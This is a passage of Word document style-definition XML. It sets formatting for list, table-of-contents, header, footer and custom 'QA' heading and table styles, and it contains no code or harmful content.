      </w:tabs>
      <w:ind w:left="643" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet3">
    <w:name w:val="List Bullet 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="926"/>
      </w:tabs>
      <w:ind w:left="926" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet4">
    <w:name w:val="List Bullet 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="1209"/>
      </w:tabs>
      <w:ind w:left="1209" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListBullet5">
    <w:name w:val="List Bullet 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="1492"/>
      </w:tabs>
      <w:ind w:left="1492" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue">
    <w:name w:val="List Continue"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="283"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue2">
    <w:name w:val="List Continue 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="566"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue3">
    <w:name w:val="List Continue 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="849"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue4">
    <w:name w:val="List Continue 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1132"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue5">
    <w:name w:val="List Continue 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1415"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber">
    <w:name w:val="List Number"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="360"/>
      </w:tabs>
      <w:ind w:left="360" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber2">
    <w:name w:val="List Number 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="643"/>
      </w:tabs>
      <w:ind w:left="643" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber3">
    <w:name w:val="List Number 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="926"/>
      </w:tabs>
      <w:ind w:left="926" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber4">
    <w:name w:val="List Number 4"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="1209"/>
      </w:tabs>
      <w:ind w:left="1209" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListNumber5">
    <w:name w:val="List Number 5"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="num" w:pos="1492"/>
      </w:tabs>
      <w:ind w:left="1492" w:hanging="360"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="MacroText">
    <w:name w:val="macro"/>
    <w:link w:val="MacroTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>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rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MacroTextChar">
    <w:name w:val="Macro Text Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="MacroText"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="MessageHeader">
    <w:name w:val="Message Header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="MessageHeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        <w:left w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        <w:bottom w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        <w:right w:val="single" w:sz="6" w:space="1" w:color="auto"/>
      </w:pBdr>
      <w:shd w:val="pct20" w:color="auto" w:fill="auto"/>
      <w:spacing w:after="0"/>
      <w:ind w:left="1134" w:hanging="1134"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MessageHeaderChar">
    <w:name w:val="Message Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="MessageHeader"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A75842"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:shd w:val="pct20" w:color="auto" w:fill="auto"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofAuthorities">
    <w:name w:val="table of authorities"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:ind w:left="240" w:hanging="240"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="480"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="960"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1440"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1680"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:ind w:left="1920"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="00A75842"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TableofFigures">
    <w:name w:val="table of figures"/>
    <w:aliases w:val="QA Table of Figures"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00B96445"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QATableBody">
    <w:name w:val="QA Table Body"/>
    <w:link w:val="QATableBodyChar"/>
    <w:qFormat/>
    <w:rsid w:val="001F177D"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QATableBodyChar">
    <w:name w:val="QA Table Body Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QATableBody"/>
    <w:rsid w:val="001F177D"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="LineNumber">
    <w:name w:val="line number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00132E95"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAFooter">
    <w:name w:val="QA Footer"/>
    <w:autoRedefine/>
    <w:rsid w:val="00881813"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="3345"/>
        <w:tab w:val="right" w:pos="6691"/>
      </w:tabs>
      <w:spacing w:after="0"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:cs="Arial"/>
      <w:noProof/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QATableHeadingWhiteChar">
    <w:name w:val="QA Table Heading White Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QATableHeadingWhite"/>
    <w:rsid w:val="00501A43"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QATableBullets">
    <w:name w:val="QA Table Bullets"/>
    <w:basedOn w:val="QATableBody"/>
    <w:link w:val="QATableBulletsChar"/>
    <w:rsid w:val="00DB34FB"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QABulletsChar">
    <w:name w:val="QA Bullets Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QABullets"/>
    <w:rsid w:val="00840C10"/>
    <w:rPr>
      <w:color w:val="2E2D2C"/>
      <w:sz w:val="24"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QATableBulletsChar">
    <w:name w:val="QA Table Bullets Char"/>
    <w:basedOn w:val="QABulletsChar"/>
    <w:link w:val="QATableBullets"/>
    <w:rsid w:val="00DB34FB"/>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cs="Arial"/>
      <w:bCs/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
      <w:sz w:val="24"/>
      <w:lang w:eastAsia="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOC2">
    <w:name w:val="toc 2"/>
    <w:aliases w:val="QA TOC 2"/>
    <w:basedOn w:val="TOC1"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00BD5211"/>
    <w:pPr>
      <w:ind w:left="238"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QABorderedText">
    <w:name w:val="QA Bordered Text"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:rsid w:val="00501A43"/>
    <w:pPr>
      <w:pBdr>
        <w:top w:val="single" w:sz="8" w:space="6" w:color="A6A6A6" w:themeColor="background1" w:themeShade="A6"/>
        <w:left w:val="single" w:sz="8" w:space="6" w:color="A6A6A6" w:themeColor="background1" w:themeShade="A6"/>
        <w:bottom w:val="single" w:sz="8" w:space="6" w:color="A6A6A6" w:themeColor="background1" w:themeShade="A6"/>
        <w:right w:val="single" w:sz="8" w:space="6" w:color="A6A6A6" w:themeColor="background1" w:themeShade="A6"/>
      </w:pBdr>
      <w:ind w:left="170" w:right="170"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QABookTitleChar">
    <w:name w:val="QA Book Title Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="QABookTitle"/>
    <w:locked/>
    <w:rsid w:val="0079323F"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005AAA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QABookTitle">
    <w:name w:val="QA Book Title"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="QABookTitleChar"/>
    <w:rsid w:val="0079323F"/>
    <w:pPr>
      <w:spacing w:after="60"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005AAA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00BE0EEB"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4513"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="HeaderChar">
    <w:name w:val="Header Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Header"/>
    <w:rsid w:val="00BE0EEB"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="00BE0EEB"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4513"/>
        <w:tab w:val="right" w:pos="9026"/>
      </w:tabs>
      <w:spacing w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="FooterChar">
    <w:name w:val="Footer Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Footer"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00BE0EEB"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="63615F" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QATableHeadingBlack">
    <w:name w:val="QA Table Heading Black"/>
    <w:basedOn w:val="QATableHeadingWhite"/>
    <w:link w:val="QATableHeadingBlackChar"/>
    <w:rsid w:val="007F5A24"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QATableHeadingBlackChar">
    <w:name w:val="QA Table Heading Black Char"/>
    <w:basedOn w:val="QATableHeadingWhiteChar"/>
    <w:link w:val="QATableHeadingBlack"/>
    <w:rsid w:val="007F5A24"/>
    <w:rPr>
      <w:caps/>
      <w:color w:val="2E2D2C" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QABold">
    <w:name w:val="QA Bold"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00840C10"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
      <w:b/>
      <w:noProof w:val="0"/>
      <w:sz w:val="24"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QABlueWords">
    <w:name w:val="QA Blue Words"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00350DF2"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
      <w:b w:val="0"/>
      <w:noProof w:val="0"/>
      <w:color w:val="005AAA"/>
      <w:sz w:val="24"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QAItalic">
    <w:name w:val="QA Italic"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00840C10"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
      <w:i/>
      <w:noProof w:val="0"/>
      <w:sz w:val="24"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="QABoldItalic">
    <w:name w:val="QA Bold Italic"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="00DB34FB"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI"/>
      <w:b/>
      <w:i/>
      <w:noProof w:val="0"/>
      <w:sz w:val="20"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAHeadingH1Module">
    <w:name w:val="QA Heading (H1) Module"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00350DF2"/>
    <w:pPr>
      <w:pageBreakBefore/>
      <w:spacing w:after="360"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005BAA"/>
      <w:sz w:val="52"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAHeadingH11NotinTOC">
    <w:name w:val="QA Heading (H1.1) Not in TOC"/>
    <w:basedOn w:val="QAHeadingH1Module"/>
    <w:next w:val="Normal"/>
    <w:rsid w:val="00426F81"/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAHeadingH2Topic">
    <w:name w:val="QA Heading (H2) Topic"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00E14991"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005BAA"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="QAHeadingH3MajorSub-heading">
    <w:name w:val="QA Heading (H3) Major Sub-heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:qFormat/>
    <w:rsid w:val="00E14991"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
      <w:color w:val="005BAA"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="QATable2">
    <w:name w:val="QA Table 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00965302"/>
    <w:pPr>
      <w:spacing w:after="0"/>
      <w:contextualSpacing/>
    </w:pPr>
    <w:tblPr>
      <w:tblCellMar>
        <w:top w:w="113" w:type="dxa"/>
        <w:bottom w:w="113" w:type="dxa"/>
      </w:tblCellMar>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:contextualSpacing/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
          <w:tl2br w:val="nil"/>
          <w:tr2bl w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:pPr>
        <w:wordWrap/>
        <w:spacing w:beforeLines="0" w:before="0" w:beforeAutospacing="0" w:afterLines="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:leftChars="0" w:left="0" w:rightChars="0" w:right="0"/>
        <w:contextualSpacing/>
        <w:mirrorIndents w:val="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:rPr>
        <w:b/>
        <w:caps/>
        <w:smallCaps w:val="0"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGridLight">
    <w:name w:val="Grid Table Light"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="40"/>
    <w:rsid w:val="00D96191"/>
    <w:pPr>
      <w:spacing w:after="0"/>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2">
    <w:name w:val="Plain Table 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="42"/>
    <w:locked/>
    <w:rsid w:val="00D96191"/>
    <w:pPr>
      <w:spacing w:after="0"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band2Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:left w:val="single" w:sz="4" w:space="0" w:color="989593" w:themeColor="text1" w:themeTint="80"/>
